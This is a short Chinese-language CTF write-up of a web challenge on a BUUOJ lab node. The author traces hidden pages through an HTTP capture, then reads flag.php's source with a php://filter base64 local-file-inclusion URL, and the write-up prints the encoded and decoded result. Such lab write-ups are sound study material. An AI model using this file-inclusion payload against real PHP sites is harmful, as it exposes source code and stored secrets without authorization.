误入了一下代码审计。。。主要是我还做出来第一步了，所以有很大兴趣继续做下去。
用开发者工具可以很容易看到被调成黑色与背景融为一体的`you find me`(大概这样)，其实也可以直接看到`Archive_room.php`这个文件名。
进去以后点点secret然后没有什么收获。
再来一次页面代码就很无聊了，所以排除再次ctrl+shift+I。
抓包试试，

**Request**
```
GET /action.php HTTP/1.1
Host: 3b51e313-5282-4581-a4c7-2d3152b688a3.node4.buuoj.cn:81
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh,zh-TW;q=0.8,zh-HK;q=0.6,en-US;q=0.4,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://3b51e313-5282-4581-a4c7-2d3152b688a3.node4.buuoj.cn:81/Archive_room.php
Upgrade-Insecure-Requests: 1
```

**Response**
```
HTTP/1.1 302 Found
Server: openresty
Date: Wed, 13 Sep 2023 12:25:16 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Location: end.php
X-Powered-By: PHP/7.3.11
Content-Length: 63

<!DOCTYPE html>

<html>
<!--
   secr3t.php        
-->
</html>
```
可以看到一个被注释了的php文件。进入该文件中，出现了一堆页面代码，不够有提示一个`flag.php`，所以我们又顺着进去看看，nothing。
然后翻翻wp，说是<u>**filter伪协议**</u>。
所以构造`https://xxx/ser3t.php?file=php://filter/convert.base64-encode/resource=flag.php`，进去之后下面那一串堪比乱码的字符如此显眼，加之我们构造的URL里面有个非常明显的base64，解码一下就是含有flag的页面代码。

```txt
PCFET0NUWVBFIGh0bWw+Cgo8aHRtbD4KCiAgICA8aGVhZD4KICAgICAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgICAgICAgPHRpdGxlPkZMQUc8L3RpdGxlPgogICAgPC9oZWFkPgoKICAgIDxib2R5IHN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOmJsYWNrOyI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPGgxIHN0eWxlPSJmb250LWZhbWlseTp2ZXJkYW5hO2NvbG9yOnJlZDt0ZXh0LWFsaWduOmNlbnRlcjsiPuWViuWTiO+8geS9oOaJvuWIsOaIkeS6hu+8geWPr+aYr+S9oOeci+S4jeWIsOaIkVFBUX5+fjwvaDE+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPHAgc3R5bGU9ImZvbnQtZmFtaWx5OmFyaWFsO2NvbG9yOnJlZDtmb250LXNpemU6MjBweDt0ZXh0LWFsaWduOmNlbnRlcjsiPgogICAgICAgICAgICA8P3BocAogICAgICAgICAgICAgICAgZWNobyAi5oiR5bCx5Zyo6L+Z6YeMIjsKICAgICAgICAgICAgICAgICRmbGFnID0gJ2ZsYWd7Y2Q0MmNhNjUtYmNjNy00YjJiLWI0ZGQtYzYxNGZjZTBjMDI3fSc7CiAgICAgICAgICAgICAgICAkc2VjcmV0ID0gJ2ppQW5nX0x1eXVhbl93NG50c19hX2cxcklmcmkzbmQnCiAgICAgICAgICAgID8+CiAgICAgICAgPC9wPgogICAgPC9ib2R5PgoKPC9odG1sPgo= 
```

base64解码之后：

```html
<!DOCTYPE html>

<html>

    <head>
        <meta charset="utf-8">
        <title>FLAG</title>
    </head>

    <body style="background-color:black;"><br><br><br><br><br><br>
        
        <h1 style="font-family:verdana;color:red;text-align:center;">啊哈！你找到我了！可是你看不到我QAQ~~~</h1><br><br><br>
        
        <p style="font-family:arial;color:red;font-size:20px;text-align:center;">
            <?php
                echo "我就在这里";
                $flag = 'flag{cd42ca65-bcc7-4b2b-b4dd-c614fce0c027}';
                $secret = 'jiAng_Luyuan_w4nts_a_g1rIfri3nd'
            ?>
        </p>
    </body>

</html>

```

就是这样子的效果，据说这叫代码审计。

----

<a href=https://blog.csdn.net/gental_z/article/details/122303393>filter伪协议</a>
<a href=https://www.cnblogs.com/linuxsec/articles/12684259.html>一些filter伪协议技巧</a>